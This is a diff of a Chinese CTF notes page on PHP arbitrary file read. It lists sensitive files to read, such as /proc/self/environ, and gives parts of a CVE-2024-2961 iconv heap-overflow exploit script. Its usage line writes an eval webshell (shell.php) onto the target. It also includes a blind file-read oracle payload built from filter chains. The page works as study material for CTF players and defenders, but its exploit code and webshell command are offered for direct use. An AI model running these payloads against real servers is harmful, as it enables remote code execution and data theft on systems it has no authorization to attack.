@@ -1,10 +1,12 @@
 ---
 title: "php任意文件读"
-pubDatetime: 2025-01-20T21:06:41.000+08:00
+modDatetime: 2025-01-20T21:06:41.000+08:00
 description: "PHP 任意文件读取常见路径、协议与利用技巧记录"
-tags: ["php-filter","php"]
+tags: ["php-filter", "php"]
 ---
+
 ## 可以尝试读取的文件
+
 1. flag
 2. /flag
 3. /fl4g
@@ -13,19 +15,21 @@ tags: ["php-filter","php"]
 6. /proc/self/environ
 7. /proc/self/cmdline
 8. /docker-entrypoint.sh
+
 ```dockerfile
 # 拷贝容器入口点脚本
 COPY ./service/docker-entrypoint.sh /docker-entrypoint.sh
 RUN chmod +x /docker-entrypoint.sh
 ```
 
-##  任意文件读取(有回显)可能可以转化为rce
+## 任意文件读取(有回显)可能可以转化为rce
 
 [学习文章](https://xz.aliyun.com/news/14986)
 CVE-2024-2961
 
 **题目**
-  ```php
+
+```php
 <?php
 
 $data = file_get_contents($_POST['file']);
@@ -35,7 +39,9 @@ echo "File contents: $data";
 ```sh
 python exp.py <url> "echo '<?=@eval(\$_POST[1]);?>' > shell.php"
 ```
+
 exp
+
 ```python
 #!/usr/bin/env python3
 #
@@ -68,17 +74,17 @@ BUG = "劄".encode("utf-8")
 
 class Remote:
     """A helper class to send the payload and download files.
-    
+
     The logic of the exploit is always the same, but the exploit needs to know how to
     download files (/proc/self/maps and libc) and how to send the payload.
-    
+
     The code here serves as an example that attacks a page that looks like:
-    
+
     <?php
-    
+
     $data = file_get_contents($_POST['file']);
     echo "File contents: $data";
-    
+
     Tweak it to fit your target, and start the exploit.
     """
 
@@ -92,7 +98,7 @@ class Remote:
         # 如果把参数手动放到url里面，那么记得手动url编码
         # url = (changedUrl).replace("+","%2b")
         return self.session.post(self.url, data={"file": path})
-        
+
     def download(self, path: str) -> bytes:
         """Returns the contents of a remote file.
         """
@@ -131,13 +137,13 @@ class Exploit:
         """Checks whether the target is reachable and properly allows for the various
         wrappers and filters that the exploit needs.
         """
-        
+
         def safe_download(path: str) -> bytes:
             try:
                 return self.remote.download(path)
             except ConnectionError:
                 failure("Target not [b]reachable[/] ?")
-            
+
 
         def check_token(text: str, path: str) -> bool:
             result = safe_download(path)
@@ -146,9 +152,9 @@ class Exploit:
         text = tf.random.string(50).encode()
         base64 = b64(text, misalign=True).decode()
         path = f"data:text/plain;base64,{base64}"
-        
+
         result = safe_download(path)
-        
+
         if text not in result:
             msg_failure("Remote.download did not return the test string")
             print("--------------------")
@@ -489,23 +495,23 @@ class Exploit:
             # Create buckets
             "zlib.inflate",
             "zlib.inflate",
-            
+
             # Step 0: Setup heap
             "dechunk",
             "convert.iconv.L1.L1",
-            
+
             # Step 1: Reverse FL order
             "dechunk",
             "convert.iconv.L1.L1",
-            
+
             # Step 2: Put fake pointer and make FL order back to normal
             "dechunk",
             "convert.iconv.L1.L1",
-            
+
             # Step 3: Trigger overflow
             "dechunk",
             "convert.iconv.UTF-8.ISO-2022-CN-EXT",
-            
+
             # Step 4: Allocate at arbitrary address and change zend_mm_heap
             "convert.quoted-printable-decode",
             "convert.iconv.L1.L1",
@@ -526,9 +532,9 @@ class Exploit:
                 raise Exception("URI too large!!!")
         except (ConnectionError, ChunkedEncodingError):
             pass
-        
+
         msg_print()
-        
+
         if not self.sleep:
             msg_print("    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/] [i](probably)[/]")
         elif start + self.sleep <= time.time():
@@ -536,7 +542,7 @@ class Exploit:
         else:
             # Wrong heap, maybe? If the exploited suggested others, use them!
             msg_print("    [b white on black] EXPLOIT [/][b white on red] FAILURE [/]")
-        
+
         msg_print()
 
 
@@ -611,15 +617,19 @@ Exploit()
 ```
 
 ## 无回显任意文件读能泄露文件内容
+
 [文章](https://tttang.com/archive/1755/)
 
 题目：
+
 ```php
 <?php file($_POST[0]);
 ```
+
 只有读取没有返回
 
 payload
+
 ```python
 import requests
 import sys
@@ -817,7 +827,7 @@ chars. rot13 and string lower are helpful. There are probably a million ways to 
 I just bruteforced every combination of iconv filters to find these.
 
 Numbers are a bit trickier because iconv doesn't tend to touch them.
-In the CTF you coud porbably just guess from there once you have the letters. But if you actually 
+In the CTF you coud porbably just guess from there once you have the letters. But if you actually
 want a full leak you can base64 encode a third time and use the first two letters of the resulting
 string to figure out which number it is.
 """
@@ -1039,6 +1049,6 @@ print(b64decode(d))
 
 ## 思考
 
-这两个是否可以结合起来, 把无回显的任意文件读取变成RCE?  ( 可能只是需要的时间长些?
+这两个是否可以结合起来, 把无回显的任意文件读取变成RCE? ( 可能只是需要的时间长些?
 
 期待大佬们的exp :>
